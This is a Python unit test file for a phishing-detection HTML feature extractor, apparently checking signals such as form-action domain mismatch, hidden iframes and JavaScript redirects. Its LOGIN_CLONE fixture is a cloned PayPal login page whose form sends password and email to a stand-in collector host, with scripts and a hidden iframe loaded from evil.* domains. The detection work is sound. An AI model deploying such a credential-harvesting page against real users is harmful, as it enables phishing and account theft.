import unittest

from src.features.html_features_v2 import (
    FEATURE_SPEC_HASH_V2,
    HTML_FEATURE_COLUMNS_V2,
    extract_html_features_v2,
    extract_html_features_v2_batch,
)


LOGIN_CLONE = """
<html><head>
  <title>PayPal Account Login</title>
  <link rel="icon" href="https://icons.evil.net/favicon.ico">
  <link rel="stylesheet" href="https://assets.evil.net/login.css">
</head><body>
  <form action="https://collector.evil.org/submit">
    <input type="password"><input type="email">
  </form>
  <a href="https://redirect.evil.com/login">Continue</a>
  <a href="#">Help</a><a href="">Back</a>
  <img src="https://img.evil.co/logo.png">
  <img src="data:image/png;base64,abc">
  <script src="https://js.evil.io/app.js"></script>
  <script>window.location.replace('/next'); document.oncontextmenu=function(e){e.preventDefault();}</script>
  <iframe hidden src="https://frame.evil.com/"></iframe>
  <div onmouseover="track()">login password verify</div>
</body></html>
"""

BENIGN_BLOG = """
<html><head><title>Example Blog</title>
<link rel="icon" href="https://example.com/favicon.ico"></head>
<body><h1>Example Blog</h1><p>Stories and updates.</p>
<a href="/about">About</a></body></html>
"""


class HtmlFeaturesV2Tests(unittest.TestCase):
    def test_login_clone_external_content_and_redirect_indicators(self):
        features = extract_html_features_v2(LOGIN_CLONE, "https://example.com/login")

        self.assertEqual(features["html_missing"], 0)
        self.assertEqual(features["has_password_and_email_inputs"], 1)
        self.assertEqual(features["num_form_action_domain_mismatches"], 1)
        self.assertEqual(features["num_external_script_domains"], 1)
        self.assertEqual(features["num_external_css_domains"], 1)
        self.assertEqual(features["num_external_image_domains"], 1)
        self.assertEqual(features["favicon_domain_mismatch"], 1)
        self.assertEqual(features["has_javascript_redirect"], 1)
        self.assertEqual(features["right_click_disabled"], 1)
        self.assertEqual(features["num_hidden_iframes"], 1)
        self.assertEqual(features["num_onmouseover_attributes"], 1)
        self.assertEqual(features["num_data_uris"], 1)
        self.assertAlmostEqual(features["empty_or_hash_link_ratio"], 2 / 3)
        self.assertEqual(features["title_registered_domain_mismatch"], 1)
        self.assertGreater(features["visible_login_keyword_count"], 0)
        self.assertNotIn("window.location", features["cleaned_text"])

    def test_benign_blog_does_not_flag_external_domain_mismatch(self):
        features = extract_html_features_v2(BENIGN_BLOG, "https://www.example.com/blog")

        self.assertEqual(features["html_missing"], 0)
        self.assertEqual(features["num_form_action_domain_mismatches"], 0)
        self.assertEqual(features["num_external_domains"], 0)
        self.assertEqual(features["favicon_domain_mismatch"], 0)
        self.assertEqual(features["title_registered_domain_mismatch"], 0)
        self.assertEqual(features["has_javascript_redirect"], 0)
        self.assertEqual(features["external_links_resources_ratio"], 0.0)
        self.assertIn("Example Blog", features["cleaned_text"])

    def test_missing_html_is_explicit_and_other_features_are_well_formed(self):
        for value in (None, float("nan"), "", "   "):
            with self.subTest(value=value):
                features = extract_html_features_v2(value, "https://example.com/")
                self.assertEqual(features["html_missing"], 1)
                self.assertEqual(features["num_forms"], 0)
                self.assertEqual(features["cleaned_text"], "")

    def test_parser_caps_input_and_batch_matches_single(self):
        long_html = "<p>example page</p>" + ("x" * 5000)
        features = extract_html_features_v2(
            long_html,
            "https://example.com/",
            max_html_chars=128,
            cleaned_text_max_chars=32,
        )
        self.assertEqual(features["html_truncated"], 1)
        self.assertEqual(features["parsed_html_length"], 128)
        self.assertLessEqual(len(features["cleaned_text"]), 32)

        records = [(LOGIN_CLONE, "https://example.com/login"), (BENIGN_BLOG, "https://example.com/blog")]
        batch = extract_html_features_v2_batch(records)
        self.assertEqual(batch[0], extract_html_features_v2(*records[0]))
        self.assertEqual(batch[1], extract_html_features_v2(*records[1]))
        self.assertEqual(list(batch[0]), HTML_FEATURE_COLUMNS_V2)
        self.assertEqual(len(FEATURE_SPEC_HASH_V2), 64)


if __name__ == "__main__":
    unittest.main()
